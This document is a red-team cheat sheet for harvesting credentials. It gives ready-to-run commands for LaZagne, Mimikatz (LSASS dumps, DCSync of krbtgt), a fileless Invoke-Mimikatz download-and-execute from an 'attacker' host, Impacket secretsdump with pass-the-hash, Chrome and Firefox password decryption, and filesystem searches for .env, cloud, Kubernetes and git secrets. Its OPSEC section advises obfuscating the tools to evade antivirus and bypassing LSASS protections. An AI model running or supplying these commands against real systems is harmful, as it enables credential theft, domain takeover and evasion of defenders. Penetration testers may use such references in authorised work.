# Credential Harvesting Reference

## LaZagne — Multi-Platform Credential Recovery

```bash
# Full dump (all modules)
python3 laZagne.py all
python3 laZagne.py all -oJ                     # JSON output
python3 laZagne.py all -oA -output /tmp/creds   # all formats

# Module-specific
python3 laZagne.py browsers                     # Chrome, Firefox, Opera, IE, Edge
python3 laZagne.py wifi                         # saved WiFi passwords
python3 laZagne.py sysadmin                     # FileZilla, WinSCP, OpenSSH, PuTTY
python3 laZagne.py databases                    # DBeavor, Squirrel, Robomongo
python3 laZagne.py mails                        # Thunderbird, Outlook

# Supported categories (Windows):
#   browsers, chats, databases, games, git, mails, maven,
#   memory, multimedia, php, svn, sysadmin, wifi, windows
# Supported categories (Linux):
#   browsers, chats, databases, mails, memory, sysadmin, wifi
```

### LaZagne Notes
- Run as **Administrator/root** for maximum results
- Windows: some creds need SYSTEM (use `psexec -s` or `token::elevate`)
- Compile to EXE with PyInstaller: `pyinstaller --onefile laZagne.py`
- AV will flag it — obfuscate or run in-memory

---

## Mimikatz — Windows Credential Extraction

### Standard Workflow

```
mimikatz # privilege::debug                      # enable SeDebugPrivilege
mimikatz # token::elevate                        # escalate to SYSTEM

# LSASS memory dump
mimikatz # sekurlsa::logonpasswords              # plaintext + hashes + tickets
mimikatz # sekurlsa::wdigest                     # WDigest plaintext (if enabled)
mimikatz # sekurlsa::credman                     # Credential Manager
mimikatz # sekurlsa::tspkg                       # TsPkg creds
mimikatz # sekurlsa::kerberos                    # Kerberos tickets

# SAM database (local accounts)
mimikatz # lsadump::sam                          # requires SYSTEM
mimikatz # lsadump::sam /sam:C:\temp\SAM /system:C:\temp\SYSTEM  # offline

# LSA secrets (service account passwords, DPAPI keys)
mimikatz # lsadump::secrets

# DCSync (needs Domain Admin or Replicating Directory Changes)
mimikatz # lsadump::dcsync /user:DOMAIN\krbtgt   # krbtgt for Golden Ticket
mimikatz # lsadump::dcsync /user:DOMAIN\Administrator
mimikatz # lsadump::dcsync /all /csv              # dump all domain hashes

# Windows Vault
mimikatz # vault::cred                           # stored Windows credentials
mimikatz # vault::list
```

### Mimikatz One-Liners

```cmd
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
mimikatz.exe "privilege::debug" "lsadump::dcsync /user:krbtgt" "exit"
```

### Invoke-Mimikatz (PowerShell, fileless)

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
Invoke-Mimikatz -DumpCreds
```

### Pypykatz (Python, offline LSASS parsing)

```bash
# Dump LSASS to file first:
# procdump -ma lsass.exe lsass.dmp
# rundll32.exe comsvcs.dll MiniDump <lsass_pid> C:\temp\lsass.dmp full

pypykatz lsa minidump lsass.dmp               # parse offline dump
pypykatz registry --sam SAM --system SYSTEM    # parse offline SAM
```

---

## Secretsdump (Impacket)

```bash
# Remote extraction (DRSUAPI or registry)
secretsdump.py domain/admin:Password123@10.10.10.1
secretsdump.py domain/admin:Password123@10.10.10.1 -just-dc   # NTDS only (DC)
secretsdump.py domain/admin:Password123@10.10.10.1 -just-dc-ntlm  # just NTLM hashes

# Pass-the-hash
secretsdump.py -hashes :a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4 domain/admin@10.10.10.1

# Offline parsing
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL    # extracted NTDS.dit
secretsdump.py -sam SAM -system SYSTEM LOCAL           # extracted SAM
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL  # full offline

# Output formats
secretsdump.py -outputfile /tmp/hashes domain/admin:pass@target  # writes .sam, .ntds, .secrets
```

---

## Browser Credential Extraction

### Chrome/Chromium (Manual)

```bash
# Linux — Chrome/Chromium passwords stored in SQLite + encrypted with DPAPI/keyring
# Login Data location:
~/.config/google-chrome/Default/Login\ Data
~/.config/chromium/Default/Login\ Data

# Cookie location:
~/.config/google-chrome/Default/Cookies

# Windows — encrypted with DPAPI
%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
%LOCALAPPDATA%\Google\Chrome\User Data\Local State   # contains encryption key

# SharpChromium (handles DPAPI decryption)
SharpChromium.exe logins
SharpChromium.exe cookies
SharpChromium.exe all
```

### Firefox

```bash
# Profile locations:
# Linux:   ~/.mozilla/firefox/*.default-release/
# Windows: %APPDATA%\Mozilla\Firefox\Profiles\*.default-release\
# macOS:   ~/Library/Application Support/Firefox/Profiles/

# Key files:
logins.json       # encrypted credentials
key4.db           # encryption key database
cert9.db          # certificates

# Decryption:
python3 firefox_decrypt.py                           # auto-detect profiles
python3 firefox_decrypt.py -p ~/.mozilla/firefox/xxxx.default-release/
python3 firefox_decrypt.py -n                        # no master password

# Manual — copy entire profile for offline extraction
tar czf /tmp/.ff.tgz ~/.mozilla/firefox/*.default-release/
```

---

## Config File Credential Patterns

```bash
# Database connection strings
grep -rni "password" /var/www/ /opt/ /etc/ --include="*.php" --include="*.py" \
  --include="*.rb" --include="*.yml" --include="*.yaml" --include="*.conf" \
  --include="*.xml" --include="*.json" --include="*.env" 2>/dev/null

# WordPress
cat /var/www/*/wp-config.php | grep DB_

# Laravel/Node .env files
find / -name ".env" -exec grep -l "PASSWORD\|SECRET\|KEY" {} \; 2>/dev/null

# Git configs (tokens)
find /home/ /root/ -name ".gitconfig" -exec cat {} \; 2>/dev/null
find / -name ".git-credentials" 2>/dev/null

# Docker configs (registry auth)
cat ~/.docker/config.json    # base64-encoded registry credentials

# Kubernetes configs
cat ~/.kube/config           # cluster certs and tokens
find / -name "*.kubeconfig" 2>/dev/null

# AWS access keys pattern: AKIA[0-9A-Z]{16}
grep -rn "AKIA[0-9A-Z]\{16\}" /home/ /opt/ /root/ /var/www/ 2>/dev/null
```

---

## OPSEC Considerations

- **LaZagne:** Highly signatured — obfuscate or compile custom
- **Mimikatz:** Signatured by every AV — use Invoke-Mimikatz, pypykatz, or custom loaders
- **LSASS access:** Triggers Credential Guard / PPL on modern Windows; use comsvcs.dll MiniDump
- **Secretsdump:** Remote mode creates services and generates event logs
- **Browser creds:** Accessing Login Data locks the file if browser is running; copy first
- **Log everything you extract** in your loot notes — track what came from where
